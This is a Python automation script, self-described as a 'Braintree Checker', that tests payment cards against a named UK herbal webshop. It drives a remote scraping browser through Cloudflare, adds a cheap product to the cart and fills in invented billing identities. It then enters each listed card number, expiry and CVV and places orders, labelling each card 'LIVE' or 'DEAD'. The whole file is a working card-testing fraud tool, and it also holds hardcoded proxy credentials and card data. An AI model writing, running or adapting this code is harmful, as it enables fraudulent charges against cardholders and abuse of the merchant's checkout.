#!/usr/bin/env python3
"""
Herbs Hands Healing - Braintree Checker v2
With auto add-to-cart before checkout
"""

from playwright.sync_api import sync_playwright
import time
import random
import json

# ═══ BrightData ═══
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

# ═══ Site ═══
SITE_URL = "https://shop.herbs-hands-healing.co.uk"

# ═══ Products (رخيصة) ═══
# اختر منتج رخيص عشان Charge يكون صغير
PRODUCT_URLS = [
    f"{SITE_URL}/product/breathe-clear-herb-tea-2",
    f"{SITE_URL}/product/evening-peace-herb-tea",
    f"{SITE_URL}/product/pollitox-capsules",
]

# ═══ Cards ═══
CARDS = [
    "5104040287872188|12|2027|951",
    "5156786158125943|07|2028|829",
]

FIRST_NAMES = ["James", "John", "Robert", "Michael"]
LAST_NAMES = ["Smith", "Johnson", "Williams"]

ADDRESSES = [
    {"address": "123 Oxford Street", "city": "London", "postcode": "W1D 2HG"},
    {"address": "45 High Street", "city": "Manchester", "postcode": "M1 1AA"},
    {"address": "78 Queen Street", "city": "Birmingham", "postcode": "B1 1AA"},
]


def connect_browser(p):
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...")
    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
    print("✅ Connected\n")
    return browser


def add_to_cart(page):
    """أضف منتج للسلة"""
    print("🛒 Adding product to cart...")
    
    # اختر منتج عشوائي
    product_url = random.choice(PRODUCT_URLS)
    print(f"   📦 Product: {product_url.split('/')[-1]}")
    
    try:
        page.goto(product_url, timeout=60000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # Wait for add to cart button
        print("   🔎 Looking for add-to-cart button...")
        
        # Try multiple selectors
        add_btn_selectors = [
            "button[name='add-to-cart']",
            ".single_add_to_cart_button",
            "button.single_add_to_cart_button",
            "button[type='submit'].single_add_to_cart_button",
            "form.cart button[type='submit']",
        ]
        
        added = False
        for sel in add_btn_selectors:
            try:
                btn = page.query_selector(sel)
                if btn and btn.is_visible():
                    btn.click()
                    print(f"   ✅ Clicked: {sel}")
                    added = True
                    break
            except:
                continue
        
        if not added:
            print("   ⚠️ Could not find add-to-cart button")
            return False
        
        time.sleep(3)
        
        # Verify cart
        cart_count = page.evaluate("""
            () => {
                const el = document.querySelector('.cart-contents-count, .cart-count');
                return el ? el.textContent : '0';
            }
        """)
        print(f"   🛒 Cart count: {cart_count}")
        
        return True
        
    except Exception as e:
        print(f"   ❌ Add to cart error: {str(e)[:100]}")
        return False


def check_card(browser, card, idx, total):
    """فحص بطاقة واحدة"""
    t0 = time.time()
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        return "INVALID_FORMAT", "Bad format", 0
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    print(f"{'═'*60}")
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}")
    print(f"{'═'*60}")
    
    context = None
    try:
        context = browser.new_context(
            viewport={"width": 1366, "height": 900},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        # Intercept
        page.add_init_script("""
            window.__all_responses = [];
            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({url, status: response.status, body});
                } catch(e) {}
                return response;
            };
        """)
        
        # ═══ Step 1: Add product to cart ═══
        print("📄 [1/8] Adding product to cart...")
        if not add_to_cart(page):
            print("   ❌ Failed to add to cart")
            try:
                context.close()
            except:
                pass
            return "NO_CART", "Could not add to cart", round(time.time() - t0, 1)
        
        # ═══ Step 2: Go to checkout ═══
        print("📄 [2/8] Going to checkout...")
        page.goto(f"{SITE_URL}/checkout", timeout=90000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # ═══ Step 3: Wait for Cloudflare ═══
        print("🛡️  [3/8] Waiting for Cloudflare...")
        for i in range(30):
            title = page.title()
            if "checking" in title.lower() or "just a moment" in title.lower():
                time.sleep(1)
            else:
                print(f"   ✅ Title: {title[:60]}")
                break
        
        # ═══ Step 4: Wait for form ═══
        print("📝 [4/8] Waiting for form...")
        try:
            page.wait_for_selector("#billing_first_name", timeout=30000)
            print("   ✅ Form visible")
        except:
            print("   ⚠️ Form not found")
            # Save HTML for debug
            try:
                html = page.content()
                with open(f"debug_checkout_{idx}.html", "w") as f:
                    f.write(html)
                print(f"   💾 Saved debug_checkout_{idx}.html")
            except:
                pass
            
            try:
                context.close()
            except:
                pass
            return "NO_FORM", "Form not loaded", round(time.time() - t0, 1)
        
        # ═══ Step 5: Fill billing ═══
        print("📝 [5/8] Filling billing...")
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
        ad = random.choice(ADDRESSES)
        
        try:
            page.fill("#billing_first_name", f)
            page.fill("#billing_last_name", l)
            page.fill("#billing_address_1", ad["address"])
            page.fill("#billing_city", ad["city"])
            page.fill("#billing_postcode", ad["postcode"])
            page.fill("#billing_phone", "07123456789")
            page.fill("#billing_email", em)
            print(f"   ✅ Filled")
        except Exception as e:
            print(f"   ⚠️ {str(e)[:100]}")
        
        time.sleep(1)
        
        # ═══ Step 6: Fill card in Hosted Fields ═══
        print("💳 [6/8] Filling card...")
        
        # Braintree Hosted Fields
        filled_card = False
        for frame in page.frames:
            try:
                # Card number
                input_el = frame.query_selector("input[name='number'], input[name='card-number']")
                if input_el:
                    input_el.click()
                    input_el.type(num, delay=random.randint(30, 80))
                    print("   ✅ Card number")
                
                # Expiry
                exp_el = frame.query_selector("input[name='expirationDate'], input[name='expiration'], input[name='expiration-date']")
                if exp_el:
                    exp_el.click()
                    exp_el.type(f"{mm}{yy[2:]}", delay=50)
                    print("   ✅ Expiry")
                
                # CVV
                cvv_el = frame.query_selector("input[name='cvv'], input[name='cvv-field']")
                if cvv_el:
                    cvv_el.click()
                    cvv_el.type(cvv, delay=50)
                    print("   ✅ CVV")
                
                filled_card = True
            except:
                continue
        
        if not filled_card:
            print("   ⚠️ Could not fill card - trying alternative...")
            # Try iframes by name
            for sel in ['iframe[name*="card-number"]', 'iframe[name*="cvv"]', 'iframe[title*="card"]']:
                try:
                    frame = page.frame_locator(sel)
                    if frame:
                        # Try to type into the frame
                        pass
                except:
                    continue
        
        time.sleep(1)
        
        # ═══ Step 7: Accept terms & place order ═══
        print("👆 [7/8] Placing order...")
        try:
            page.check("#terms")
            page.check("#gdpr_woo_consent")
        except:
            pass
        
        time.sleep(1)
        
        try:
            page.click("#place_order")
            print("   ✅ Clicked Place Order")
        except:
            try:
                page.click("button[name='woocommerce_checkout_place_order']")
            except:
                print("   ⚠️ Could not click")
        
        # ═══ Step 8: Wait for response ═══
        print("⏳ [8/8] Waiting for response...")
        result_code = "UNKNOWN"
        result_text = ""
        
        for i in range(40):
            time.sleep(1)
            
            # Check API responses
            try:
                responses = page.evaluate("() => window.__all_responses || []")
                for r in reversed(responses):
                    url = r.get('url', '')
                    body = r.get('body', '')
                    
                    if any(x in url for x in ['.js', '.css', '.png', '.jpg']):
                        continue
                    
                    if 'braintree' in url.lower() or 'checkout' in url.lower():
                        try:
                            data = json.loads(body)
                            
                            if 'errors' in data:
                                errors = data['errors']
                                if errors:
                                    ext = errors[0].get('extensions', {})
                                    error_code = ext.get('errorCode', '')
                                    error_msg = errors[0].get('message', '')
                                    
                                    result_code = error_code or "DECLINED"
                                    result_text = error_msg[:200]
                                    
                                    # Save for debug
                                    try:
                                        with open(f"response_{idx}.json", "w") as fp:
                                            json.dump(data, fp, indent=2)
                                    except:
                                        pass
                                    break
                            
                            if 'result' in data and data.get('result') == 'success':
                                result_code = "CHARGE $1"
                                result_text = "Order placed"
                                break
                        except:
                            body_lower = body.lower()
                            if 'insufficient' in body_lower:
                                result_code = "INSUFFICIENT_FUNDS"
                                break
                            elif 'declined' in body_lower:
                                result_code = "DECLINED"
                                break
                if result_code != "UNKNOWN":
                    break
            except:
                pass
            
            # Check page text
            try:
                page_text = page.inner_text("body")
                text_lower = page_text.lower()
                
                if 'thank you' in text_lower and 'order' in text_lower:
                    result_code = "CHARGE $1"
                    result_text = "Thank you page"
                    break
                elif 'insufficient' in text_lower:
                    result_code = "INSUFFICIENT_FUNDS"
                    break
                elif 'declined' in text_lower:
                    result_code = "DECLINED"
                    break
                elif 'do not honor' in text_lower:
                    result_code = "DO_NOT_HONOR"
                    break
            except:
                pass
            
            if (i + 1) % 5 == 0:
                print(f"   ⏳ {i+1}s...")
        
        # Save final HTML
        try:
            html = page.content()
            with open(f"result_{idx}.html", "w") as f:
                f.write(html)
        except:
            pass
        
        try:
            context.close()
        except:
            pass
        
    except Exception as e:
        print(f"❌ Error: {str(e)[:150]}")
        result_code = f"ERR: {str(e)[:60]}"
        result_text = str(e)[:100]
        if context:
            try:
                context.close()
            except:
                pass
    
    elapsed = round(time.time() - t0, 1)
    print(f"\n📝 {result_code}")
    if result_text:
        print(f"   💬 {result_text}")
    print(f"⏱️  {elapsed}s\n")
    
    return result_code, result_text, elapsed


def main():
    print("=" * 60)
    print("  🌿 Herbs Hands Healing - v2 (Auto Cart)")
    print("  🚀 BrightData Scraping Browser")
    print("=" * 60)
    print(f"\n  💳 Cards: {len(CARDS)}\n")
    
    with sync_playwright() as p:
        browser = connect_browser(p)
        
        results = []
        for idx, card in enumerate(CARDS, 1):
            try:
                code, text, elapsed = check_card(browser, card, idx, len(CARDS))
            except Exception as e:
                code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
            
            results.append({
                'card': card,
                'code': code,
                'text': text,
                'elapsed': elapsed,
            })
            
            if idx < len(CARDS):
                delay = random.uniform(10, 15)
                print(f"⏸️  Waiting {delay:.1f}s...\n")
                time.sleep(delay)
        
        try:
            browser.close()
        except:
            pass
    
    # Summary
    print("=" * 60)
    print("📊 النتائج النهائية")
    print("=" * 60)
    
    live_codes = ['INSUFFICIENT_FUNDS', 'DECLINED', 'DO_NOT_HONOR', 
                  'CHARGE $1', 'TOKENIZED']
    
    for r in results:
        code = r['code']
        status = "🔥 LIVE" if code in live_codes else "❌ DEAD"
        
        print(f"\n💳 {r['card']}")
        print(f"   📝 {r['code']}")
        if r['text']:
            print(f"   💬 {r['text']}")
        print(f"   {status} | ⏱️ {r['elapsed']}s")


if __name__ == "__main__":
    main()
